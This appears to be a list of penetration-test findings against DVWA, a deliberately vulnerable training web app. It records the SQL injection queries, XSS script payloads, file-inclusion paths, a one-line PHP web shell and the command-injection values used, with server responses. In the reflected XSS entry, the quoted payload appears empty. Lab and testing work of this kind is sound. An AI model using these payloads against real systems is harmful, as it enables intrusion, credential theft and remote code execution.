findings.title: SQL Injection (UNION) at /vulnerabilities/sqli/ extracts DB version and user password hashes
findings.expected: Server returns DB version and MD5 password hashes for users via UNION-based SQLi.
findings.observed: UNION SELECT 1,version() returned 'Surname: 10.1.26-MariaDB-0+deb9u1'. UNION SELECT user,password FROM users returned 'admin'/'5f4dcc3b5aa765d61d8327deb882cf99' and 'smithy'/'5f4dcc3b5aa765d61d8327deb882cf99' (MD5 of 'password').

findings.title: Blind SQL Injection (boolean) at /vulnerabilities/sqli_blind/ via SUBSTRING inference
findings.expected: Boolean-based blind SQLi allows character-by-character extraction of admin's password hash.
findings.observed: True condition (1' AND '1'='1) returns 'User ID exists'; false condition (1' AND '1'='2) returns 'User ID is MISSING'. First character probe of admin's password hash equals '5' (matches MD5('password') = 5f4dcc3b5aa765d61d8327deb882cf99).

findings.title: Reflected XSS at /vulnerabilities/xss_r/ via 'name' parameter (no output encoding)
findings.expected: Reflected XSS — the 'name' parameter is echoed back into the response body without HTML encoding, allowing script injection in the attacker's session context.
findings.observed:
Response body contains the literal substring '' inside 
Hello
— browser would execute the script on page load.

findings.title: Stored XSS at /vulnerabilities/xss_s/ via 'mtxMessage' guestbook field (persists across requests)
findings.expected: Stored XSS — the guestbook entry persists and the script tag is rendered unencoded for any subsequent visitor.
findings.observed: After POSTing mtxMessage=<script>alert(1)</script>, a subsequent GET /vulnerabilities/xss_s/ contains the raw <script> tag in the guestbook table — executes in any visitor's browser.

findings.title: Local File Inclusion (LFI) at /vulnerabilities/fi/ via 'page' parameter; php://filter enables source disclosure
findings.expected: LFI allows arbitrary local file read; php://filter wrapper discloses PHP source code (bypasses execution).
findings.observed: GET ?page=/etc/passwd returns 'root:x:0:0:root:/root:/bin/bash' from the system /etc/passwd. GET ?page=php://filter/convert.base64-encode/resource=index.php returns base64 that decodes to the raw source of index.php.

findings.title: Arbitrary File Upload leads to RCE at /vulnerabilities/upload/ (no extension/type filter; .php is web-executable)
findings.expected: Uploading a .php file lands in a web-executable directory and yields remote code execution.
findings.observed: After uploading a PHP file with body '<?php echo shell_exec($_GET["c"]); ?>', the server reported 'succesfully uploaded!'. A subsequent GET /hackable/uploads/webshell.php?c=id returned 'RCE-OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)'.

findings.title: OS Command Injection at /vulnerabilities/exec/ via 'ip' parameter (shell_exec with ;, |, &&)
findings.expected: OS command injection via shell metacharacters in the 'ip' parameter (passed unsanitized to shell_exec).
findings.observed:
POST ip=127.0.0.1;id -> 
 ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
. POST ip=127.0.0.1|id -> same 'uid=33(www-data)' output. The ';' and '|' separators both yield RCE as the www-data user.

findings.title: CSRF on admin password change at /vulnerabilities/csrf/ (no anti-CSRF token on form)
findings.expected: CSRF — the password-change form lacks an anti-CSRF token, so a cross-site form submission from the victim's browser will silently change admin's password.
findings.observed: GET /vulnerabilities/csrf/ exposes a form with only fields password_new, password_conf, Change (no user_token). A POST with matching new/confirm values changes the admin password without any further challenge.

findings.title: Weak authentication: default credentials admin/password accepted at /vulnerabilities/brute/ and DVWA login.php
steps: EXPECT Welcome to the password protected area
findings.expected: Default credentials allow access; wrong credentials are clearly rejected (timing/response distinguishable, suitable for brute force).
findings.observed: GET /vulnerabilities/brute/?username=admin&password=password&Login=Login returns 'Welcome to the password protected area'. GET ...password=wrong returns 'Username and/or password incorrect.' The 'security=low' setting additionally makes the brute page's login query vulnerable to SQL injection (e.g., admin' -- ).

findings.title: DOM-based XSS at /vulnerabilities/xss_d/ via 'default' query parameter (document.write sink)
findings.expected: DOM-based XSS — the 'default' URL parameter is extracted via document.location.href.substring and written into the DOM via document.write, allowing arbitrary script execution when the page is loaded with a crafted URL fragment.
findings.observed: Page source contains 'if (document.location.href.indexOf("default=") >= 0) { var lang = document.location.href.substring(...+8); document.write("<option value='" + decodeURI(lang) + "'>" + decodeURI(lang) + "</option>"... }'. The 'default' parameter value is reflected into a <select> option without server-side encoding, fully controllable client-side.
